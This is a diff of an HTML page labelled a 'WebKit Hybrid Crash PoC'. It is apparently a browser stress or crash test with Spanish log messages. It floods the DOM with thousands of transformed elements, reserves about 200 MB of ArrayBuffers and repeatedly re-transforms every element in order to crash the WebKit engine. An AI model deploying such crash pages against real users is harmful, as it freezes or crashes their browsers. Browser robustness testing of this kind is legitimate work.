@@ -1,41 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebKit Crash Attempt (DOM Focused)</title>
+  <title>WebKit Hybrid Crash PoC</title>
   <style>
-    body { background: black; color: lime; font-family: monospace; }
-    .bomb { width: 50px; height: 50px; background: red; position: absolute; }
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+    }
+    .box {
+      width: 60px;
+      height: 60px;
+      background: rgba(255, 0, 0, 0.3);
+      position: absolute;
+      transition: transform 0.05s linear;
+    }
   </style>
 </head>
 <body>
-  <h1>Test: DOM Flooding sin ArrayBuffer</h1>
-  <pre id="log">Iniciando...</pre>
+  <h1>Ejecutando prueba híbrida WebKit...</h1>
+  <pre id="log">Inicializando...</pre>
 
   <script>
-    const log = txt => document.getElementById("log").textContent += "\n" + txt;
+    const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-    let container = document.createElement("div");
-    document.body.appendChild(container);
+    try {
+      log("Generando elementos dinámicos y transformaciones...");
 
-    let count = 0;
-    let interval = setInterval(() => {
-      for (let i = 0; i < 100; i++) {
-        let el = document.createElement("div");
-        el.className = "bomb";
-        el.style.left = `${Math.random() * window.innerWidth}px`;
-        el.style.top = `${Math.random() * window.innerHeight}px`;
-        el.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 5})`;
-        container.appendChild(el);
+      const container = document.createElement("div");
+      document.body.appendChild(container);
+
+      // Crear muchos elementos con transformaciones
+      for (let i = 0; i < 3000; i++) {
+        const div = document.createElement("div");
+        div.className = "box";
+        div.style.left = `${Math.random() * window.innerWidth}px`;
+        div.style.top = `${Math.random() * window.innerHeight}px`;
+        div.style.transform = `rotate(${Math.random() * 360}deg) scale(${1 + Math.random() * 3})`;
+        container.appendChild(div);
       }
 
-      count += 100;
-      log(`Creados ${count} elementos`);
+      log("Reservando memoria controlada con ArrayBuffer...");
 
-      if (count > 10000) {
-        log("Finalizando test.");
-        clearInterval(interval);
+      let buffers = [];
+      let totalMB = 0;
+
+      // Solo reservamos hasta ~200 MB para evitar el error
+      for (let i = 0; i < 200; i++) {
+        buffers.push(new ArrayBuffer(1024 * 1024)); // 1 MB
+        totalMB++;
+        if (i % 20 === 0) log(`ArrayBuffers: ${totalMB} MB`);
       }
-    }, 100);
+
+      log("Estresando el motor con cambios rápidos...");
+
+      let tick = 0;
+      const interval = setInterval(() => {
+        container.childNodes.forEach(node => {
+          node.style.transform = `rotate(${tick}deg) scale(${1 + (tick % 5)})`;
+        });
+        tick += 15;
+        if (tick > 5000) {
+          clearInterval(interval);
+          log("Prueba completada.");
+        }
+      }, 50);
+
+    } catch (e) {
+      log("Excepción atrapada: " + e.toString());
+    }
   </script>
 </body>
 </html>
